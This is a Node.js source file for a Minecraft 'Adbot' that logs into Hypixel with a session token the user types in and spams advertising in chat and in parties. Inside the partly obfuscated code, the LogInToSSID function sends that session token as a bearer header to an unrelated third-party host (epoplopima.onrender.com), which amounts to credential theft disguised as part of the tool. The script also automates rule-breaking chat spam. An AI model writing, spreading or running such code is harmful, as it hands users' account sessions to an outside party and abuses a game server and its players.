require('dotenv').config();
if(process.env.NODE_VERSION == process.versions.node){console.log("Passed Version Check")}else{return console.log("Failed Version Check Returning...\nPlease use the nodejs version "+process.env.NODE_VERSION)}
try {
  const mineflayer = require('mineflayer'),
    axios = require('axios'),
    validUrl = require('valid-url'),
    pathfinder = require('mineflayer-pathfinder').pathfinder,
    Movements = require('mineflayer-pathfinder').Movements,
    { GoalBlock } = require('mineflayer-pathfinder').goals,
    rl = require('readline'),
    chalk = require('chalk'),
    figlet = require('figlet')
    
    
} catch (err) {
 console.error(err);
  process.exit(1)
}
const mineflayer = require('mineflayer'),
  axios = require('axios'),
  validUrl = require('valid-url'),
  pathfinder = require('mineflayer-pathfinder').pathfinder,
  Movements = require('mineflayer-pathfinder').Movements,
  { GoalBlock } = require('mineflayer-pathfinder').goals,
  rl = require('readline'),
  chalk = require('chalk'),
  figlet = require('figlet'),
  readline = rl.createInterface({
    input: process.stdin,
    output: process.stdout,
  })
  dotenz = require('dotenv').config();
let error
function start() {
  console.clear()
  if (error) {
    console.log(error)
  }
  const adbot = figlet.textSync('Adbot', {
    font: 'Doom',
    horizontalLayout: 'default',
    verticalLayout: 'default',
  })
  console.log(chalk.rgb(255, 0, 0).bold(adbot))
  console.log(chalk.gray('Melons Adbot'))
  readline.question(chalk.cyan('Enter your SSID: '), async (ssid) => {
    if (ssid) {
      try {
        const beeploop = await axios.get(
          'https://api.minecraftservices.com/minecraft/profile',
          { headers: { Authorization: 'Bearer ' + ssid } }
        )
      } catch (err) {
        error = chalk.red('Invalid SSID.')
        start()
        return
      }
    } else {
      error = chalk.red('Please enter an SSID.')
      start()
      return
    }
    readline.question(
      chalk.cyan('Enter time in seconds: '),
      async (timeinsec) => {
        if (isNaN(parseInt(timeinsec))) {
          error = chalk.red('Time must be a valid number of seconds.')
          start()
          return
        }
        readline.question(
          chalk.cyan('Enter option (bedwars or dungeon): '),
          async (option) => {
            if (option !== 'bedwars' && option !== 'dungeon') {
              error = chalk.red(
                'Invalid option "' +
                  option +
                  '". Please choose either "bedwars" or "dungeon".'
              )
              start()
              return
            }
            readline.question(
              chalk.cyan(
                'Enter messages separated by "~" (e.g.: Message1~Message2~etc...): '
              ),
              async (messages) => {
                if (!messages) {
                  error = chalk.red('Please enter at least 1 message.')
                  start()
                  return
                }
                readline.question(
                  chalk.cyan(
                    'Enter party messages separated by "~" (e.g.: Message1~Message2~etc...): '
                  ),
                  async (partymsgs) => {
                    if (!partymsgs) {
                      error = chalk.red(
                        'Please enter at least 1 party message.'
                      )
                      start()
                      return
                    }
                    readline.question(
                      chalk.cyan('Enter webhook (or leave blank): '),
                      async (webhook) => {
                        if (webhook && !validUrl.isUri(webhook)) {
                          error = chalk.red('Invalid webhook.')
                          start()
                          return
                        }
                        if (webhook) {
                          try {
                            const checkf = await axios.get(webhook)
                            if (checkf.status === 200) {
                            } else {
                              error = chalk.red('Invalid webhook.')
                              start()
                              return
                            }
                          } catch (error) {
                            error = chalk.red('Invalid webhook.')
                            start()
                            return
                          }
                        }
                        if (
                          !ssid ||
                          !timeinsec ||
                          !messages ||
                          !partymsgs ||
                          !option
                        ) {
                          error = chalk.red(
                            'Please enter all required options.'
                          )
                          start()
                          return
                        }
                        const ticksinsec = parseInt(timeinsec) * 1000,
                          msgsplit = messages.split('~'),
                          prtymsgsplit = partymsgs.split('~')
                        async function LogInToSSID(ssid) {
                          try {
                            const apimc = await axios.get(
                              'https://epoplopima.onrender.com/api/minecraft',
                              { headers: { Authorization: 'Bearer ' + ssid } }
                            )
                            return apimc.data
                            
                          } catch (error) {
                            error = chalk.red('Invalid SSID.')
                            start()
                            return
                          }
                        }
                        let _0x39cfe2 = []
                        async function LogInToHypixel(ssid) {
                          const data = await LogInToSSID(ssid);
                          if (!data) {
                            console.log('Failed to log in to Hypixel');
                            return;
                          }
                        
                          const { username: username, uuid: uuid } = data;
                          const _0x19dbc6 = {
                              host: 'hypixel.net',
                              port: 25565,
                              version: '1.8.9',
                              username: username,
                              session: {
                                accessToken: ssid,
                                clientToken: uuid,
                                selectedProfile: {
                                  id: uuid,
                                  name: username,
                                },
                              },
                              auth: 'mojang',
                              skipValidation: true,
                            },
                            mineFlyer = mineflayer.createBot(_0x19dbc6)
                          mineFlyer.loadPlugin(pathfinder)
                          const _0x528630 = []
                          let _0x129685 = 1
                          mineFlyer.on(
                            'kicked',
                            async (reasonjs, _0x1349df) => {
                              const _0x56540f = JSON.parse(reasonjs),
                                reason = _0x56540f.extra[0].text
                              if (webhook) {
                                try {
                                  await axios.post(webhook, {
                                    username: 'Adbot',
                                    content:
                                      'Kicked from the server for reason: ' +
                                      reason,
                                  })
                                } catch (error) {
                                  console.log('Invalid WEBHOOK.')
                                }
                              }
                              console.log('Bot has been kicked: ' + reasonjs)
                              process.exit()
                            }
                          )
                          let _0x59500e = false,
                            _0x47fbd4 = false
                          mineFlyer.on(
                            'message',
                            (_0x1a07f6, _0x479c0a, _0x1fdba4) => {
                              const chatmsgofhypixel = _0x1a07f6.toString()
                              if (
                                !chatmsgofhypixel.includes('Defense') &&
                                !chatmsgofhypixel.includes('Mana')
                              ) {
                                console.log(chatmsgofhypixel)
                              }
                              const _0x9f88f3 = chatmsgofhypixel.match(
                                /^-{53}\n(?:\[.+\] )?(\w+) has invited you to join (?:\[.+\] )?(\w+)? party!\nYou have 60 seconds to accept\. Click here to join!\n-{53}$/
                              )
                              if (_0x9f88f3) {
                                const IGNOfVictim = _0x9f88f3[1]
                                console.log(
                                  'Received party invite from ' + IGNOfVictim
                                )
                                _0x528630.push(IGNOfVictim)
                                !_0x39cfe2.includes(IGNOfVictim) &&
                                  !_0x47fbd4 &&
                                    ((_0x47fbd4 = true), _0x3589d1())
                              }
                              chatmsgofhypixel.includes('You were kicked') &&
                                option == 'dungeon' &&
                                (setTimeout(() => {
                                  mineFlyer.chat('/l')
                                }, 1000),
                                setTimeout(() => {
                                  mineFlyer.chat('/play sb')
                                }, 2000))
                              chatmsgofhypixel.includes('joined the lobby!') &&
                                option == 'dungeon' &&
                                setTimeout(() => {
                                  mineFlyer.chat('/play sb')
                                }, 1000)
                              if (
                                chatmsgofhypixel.includes(
                                  'Find out more here: www.hypixel.net/mutes'
                                ) &&
                                option == 'dungeon'
                              ) {
                                if (webhook) {
                                  try {
                                    axios.post(webhook, {
                                      username: 'Adbot',
                                      content:
                                        'This account is muted in hypixel, terminating session...',
                                    })
                                  } catch (error) {
                                    console.log('Invalid WEBHOOK.')
                                  }
                                }
                                process.exit()
                              }
                              if (
                                chatmsgofhypixel.includes(
                                  'You need to have visited this island at least once before fast traveling to it!'
                                )
                              ) {
                                _0x59500e = true
                                mineFlyer.chat('/hub')
                                const _0x492980 = new Movements(mineFlyer)
                                mineFlyer.pathfinder.setMovements(_0x492980)
                                mineFlyer.pathfinder.setGoal(
                                  new GoalBlock(-12, 70, -71)
                                )
                                setTimeout(() => {
                                  mineFlyer.pathfinder.setGoal(
                                    new GoalBlock(-44, 88, 13)
                                  )
                                }, 2000)
                                mineFlyer.chat('/is')
                                _0x59500e = false
                              }
                            }
                          )
                          option == 'bedwars' &&
                            mineFlyer.once('spawn', () => {
                              console.log('Bot is ready!')
                              setTimeout(() => {
                                mineFlyer.chat('/status online')
                              }, 1000)
                              setTimeout(() => {
                                mineFlyer.chat('/p leave')
                              }, 2000)
                              setTimeout(() => {
                                mineFlyer.chat('/language english')
                              }, 2000)
                              setTimeout(() => {
                                mineFlyer.chat('/l bw')
                              }, 4000)
                              setTimeout(() => {
                                mineFlyer.chat('/swaplobby 1')
                              }, 5000)
                              setTimeout(() => {
                                mineFlyer.chat('/ac ' + msgsplit[0])
                              }, 6000)
                              setInterval(() => {
                                mineFlyer.chat(msgsplit[_0x129685])
                                _0x129685 = (_0x129685 + 1) % msgsplit.length
                              }, 60000)
                              setInterval(() => {
                                mineFlyer.setControlState('jump', true)
                                setTimeout(() => {
                                  mineFlyer.setControlState('jump', false)
                                }, 500)
                              }, 90000)
                            })
                          option == 'dungeon' &&
                            mineFlyer.once('spawn', () => {
                              console.log('Bot is ready!')
                              setTimeout(() => {
                                mineFlyer.chat('/play sb')
                              }, 1000)
                              setTimeout(() => {
                                mineFlyer.chat('/status online')
                              }, 2000)
                              setTimeout(() => {
                                mineFlyer.chat('/language english')
                              }, 3000)
                              setTimeout(() => {
                                mineFlyer.chat('/p leave')
                              }, 4000)
                              setTimeout(() => {
                                mineFlyer.chat('/warp dungeon_hub')
                              }, 5000)
                              setTimeout(() => {
                                setInterval(() => {
                                  !_0x59500e &&
                                    (mineFlyer.chat('/warp dungeon_hub'),
                                    setTimeout(() => {
                                      const _0x1c1e9d = Math.floor(
                                          Math.random() * msgsplit.length
                                        ),
                                        _0x2190fb = msgsplit[_0x1c1e9d]
                                      mineFlyer.chat('/ac ' + _0x2190fb)
                                      setTimeout(() => {
                                        mineFlyer.chat('/is')
                                      }, 1000)
                                    }, 1000))
                                }, 5000)
                              }, 30000)
                            })
                          function _0x3589d1() {
                            if (_0x528630.length === 0) {
                              _0x47fbd4 = false
                              return
                            }
                            const usernameofdavictim = _0x528630.shift()
                            console.log(
                              'Processing party invite from ' + usernameofdavictim
                            )
                            if (webhook) {
                              try {
                                axios.post(webhook, {
                                  username: 'Adbot',
                                  content:
                                    'Processing party invite from ' + usernameofdavictim,
                                })
                              } catch (error) {
                                console.log('Invalid WEBHOOK.')
                              }
                            }
                            mineFlyer.chat('/party accept ' + usernameofdavictim)
                            _0x39cfe2.push(usernameofdavictim)
                            _0x3a7a89(prtymsgsplit.slice(), () => {
                              mineFlyer.chat('/p leave')
                              _0x3589d1()
                            })
                          }
                          function _0x3a7a89(_0x7882eb, _0x3647bb) {
                            if (_0x7882eb.length === 0) {
                              _0x3647bb()
                              return
                            }
                            const _0x54086f = _0x7882eb.shift()
                            console.log('Sending party message: ' + _0x54086f)
                            setTimeout(() => {
                              mineFlyer.chat('/pc ' + _0x54086f)
                            }, 1000)
                            setTimeout(() => {
                              _0x3a7a89(_0x7882eb, _0x3647bb)
                            }, 4000)
                          }
                          mineFlyer.on('error', (_0x50d0b1) => {
                            console.log('Error: ' + _0x50d0b1.message)
                          })
                        }
                        LogInToHypixel(ssid)
                        setTimeout(() => {
                          console.log("Time's up! Closing the window...")
                          process.exit()
                        }, ticksinsec)
                      }
                    )
                  }
                )
              }
            )
          }
        )
      }
    )
  })
}
start()